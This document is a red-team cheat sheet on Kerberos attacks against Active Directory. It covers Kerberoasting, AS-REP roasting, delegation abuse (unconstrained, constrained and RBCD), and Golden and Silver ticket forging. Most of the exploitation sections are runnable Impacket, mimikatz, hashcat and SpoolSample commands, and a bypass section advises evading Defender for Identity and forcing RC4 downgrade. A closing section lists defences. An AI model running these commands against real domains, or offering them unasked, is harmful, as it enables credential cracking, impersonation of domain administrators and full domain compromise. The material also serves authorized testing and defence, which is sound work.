# Kerberos Attacks

> AS-REP Roasting, Kerberoasting, unconstrained/constrained/RBCD delegation, Golden/Silver tickets, S4U abuse. Authorized testing only. Map: MITRE ATT&CK T1558.

## TL;DR
- Kerberos AS-REQ → AS-REP (TGT) → TGS-REQ → TGS-REP (service ticket). The TGS-REP for service `<svc>` is encrypted with the service account's NTLM hash → crackable offline if the password is weak.
- AS-REP Roasting targets accounts with `DONT_REQ_PREAUTH` set (rare but it happens).
- Delegation chains (unconstrained, constrained, RBCD) turn a single compromised computer/account into "impersonate any user on this service".
- Golden Ticket = forged TGT signed with the `krbtgt` account's NTLM hash (post-DA). Silver Ticket = forged service ticket for one service.
- Cite MS-KILE specifics where relevant.

## Detection / Discovery

### Find Kerberoastable accounts (with SPN, user accounts only)
```bash
# Impacket — request all roastable TGS-REPs in one shot
GetUserSPNs.py <domain>/<user>:<password> -dc-ip <DC> -request \
  -outputfile kerberoast.txt
```
With BloodHound:
```cypher
MATCH (u:User {hasspn:true, enabled:true})
RETURN u.samaccountname, u.serviceprincipalnames
```

### Find AS-REP roastable accounts (preauth disabled)
```bash
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <DC>
# Returns $krb5asrep$ hashes for any user with DONT_REQ_PREAUTH

# Discovery via BloodHound
# MATCH (u:User {dontreqpreauth:true}) RETURN u.samaccountname
```

### Delegation surface
```cypher
// Unconstrained delegation — danger class
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// Constrained delegation
MATCH (u)-[:AllowedToDelegate]->(c) RETURN u, c

// Resource-Based Constrained Delegation (target controls who delegates to it)
MATCH (u)-[:AddAllowedToAct]->(c) RETURN u, c
```

## Exploitation

### Kerberoasting
The TGS-REP for an SPN is encrypted under the service account's NTLM hash → crack offline:
```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
john --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt
```
If the SPN points at a *user* account (not gMSA / managed account), the password is human-set → crackable. gMSA / MSA accounts rotate automatically and use 240-character entropy → uncrackable.

### AS-REP Roasting
```bash
# From the GetNPUsers.py output:
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```
Same logic — user-set password → cracked offline.

### Pass-the-Hash → use as Kerberos pre-auth
Once you've cracked or extracted an NTLM hash, you can use it directly to get a TGT (skipping the password):
```bash
# Impacket
getTGT.py <domain>/<user> -hashes :<NTLM> -dc-ip <DC>
export KRB5CCNAME=<user>.ccache
psexec.py -k -no-pass <user>@<host>
```
This is "Overpass-the-Hash" / Pass-the-Key.

### Unconstrained Delegation
A computer (or user) with `TrustedForDelegation=true` receives the TGT of any user who authenticates to it. Compromise that machine → wait for a DA login → grab the cached TGT and impersonate DA.
```bash
# On the compromised host
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export   # dumps all cached tickets (.kirbi)

# Force a DA login via printer-bug / Spooler RPC (CVE-2021-34527-adjacent)
SpoolSample.py <attacker> <target> -d <domain> -u <user> -p <pass>
# A DC will reflect-authenticate to <attacker> with TGT in tow

# Pass the captured TGT
mimikatz # kerberos::ptt admin.kirbi
```

### Constrained Delegation (S4U2self + S4U2proxy)
Account A has `msDS-AllowedToDelegateTo` pointing at service B on host C. A can request a service ticket for *any user* against B/C — including DA.
```bash
# Impacket
getST.py -spn cifs/<target> -impersonate Administrator <domain>/<A>:<password> -dc-ip <DC>
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <target>     # full DC sync via DA cifs ticket on the DC
```

### Resource-Based Constrained Delegation (RBCD)
The target object grants delegation rights via `msDS-AllowedToActOnBehalfOfOtherIdentity`. If you have `WriteDACL` / `GenericAll` on a target computer, you can write yourself in:
```bash
# Set RBCD — your controlled account becomes a delegate to TARGET$
addcomputer.py -computer-name FAKE$ -computer-pass 'Pass123!' <domain>/<user>:<password> -dc-ip <DC>
rbcd.py <domain>/<user>:<password> -delegate-to TARGET$ -delegate-from FAKE$ -dc-ip <DC>
# Now S4U from FAKE$ -> impersonate any user (e.g. Administrator) on TARGET
getST.py -spn cifs/TARGET.<domain> -impersonate Administrator <domain>/FAKE\$:'Pass123!' -dc-ip <DC>
```

### Golden Ticket (post-DA)
Requires the `krbtgt` account's NTLM hash (from `secretsdump.py`, NTDS.dit, or mimikatz `lsadump::dcsync /user:krbtgt`):
```bash
ticketer.py -nthash <krbtgt-hash> -domain-sid <SID> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass Administrator@<DC>
```
Lasts until `krbtgt` is rotated twice (which most orgs don't do).

### Silver Ticket
Forged TGS for one service (krbtgt not needed — just the *service account's* NTLM hash):
```bash
ticketer.py -nthash <svc-hash> -domain-sid <SID> -domain <domain> -spn cifs/<target> <username>
```
Quieter than Golden because no TGS-REQ to DC for that service.

## Bypasses
- AES-only environments (`SupportedEncryptionTypes`) — hashcat needs `-m 19600`/`-m 19700` (TGS-AES128/AES256); rate is much lower than RC4. Force RC4 by requesting with `-no-preauth -etype 23` if domain still allows it.
- Microsoft Defender for Identity alerts on TGS request floods — distribute over time, request only specific SPNs you intend to crack offline.
- `AllowTGTSessionKey=0` (default 0) — TGTs in memory don't have session keys reused; affects some old PtT tooling.
- Forcing pre-auth on AS-REP roastable accounts (defender-side) shuts down the technique.

## Defence / Remediation
- **gMSA / MSA** for service accounts — auto-rotating 240-char password makes Kerberoasting useless.
- **Enforce pre-authentication** on every user account; audit for `DONT_REQ_PREAUTH` (event 4738 / AS-REQ without pre-auth).
- **Disable unconstrained delegation** on every computer except DCs. Use constrained delegation with auth protocol = Kerberos only, never NTLM-allowed.
- **Protected Users** group + Credential Guard on Tier-0 — disables NTLM, RC4 Kerberos, delegation; raises the bar significantly.
- **Rotate `krbtgt` twice** after any DA-level compromise (Microsoft's recommended runbook).
- **Long, complex passwords** for service accounts that can't migrate to gMSA. ≥ 30 chars + rotation every 6 months minimum.
- **LAPS** for local admin password rotation per host.
- **Microsoft Defender for Identity / Falcon Identity Protection** — high-fidelity alerts for golden ticket, DCSync, encryption downgrade, anomalous Kerberos behaviour.

## Sources
- harmj0y — Roasting AS-REPs: https://blog.harmj0y.net/activedirectory/roasting-as-reps/
- harmj0y — A Guide to Attacking Domain Trusts: https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/
- ired.team — Kerberos delegation: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
- SpecterOps — Wagging the Dog (RBCD): https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
- HackTricks Kerberos abuse: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberos-double-hop-problem.html
- Microsoft — Protected Users group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group
- Impacket toolkit: https://github.com/fortra/impacket
- Microsoft — How to Reset krbtgt: https://github.com/microsoft/New-KrbtgtKeys.ps1
- MITRE ATT&CK T1558 Steal or Forge Kerberos Tickets: https://attack.mitre.org/techniques/T1558/
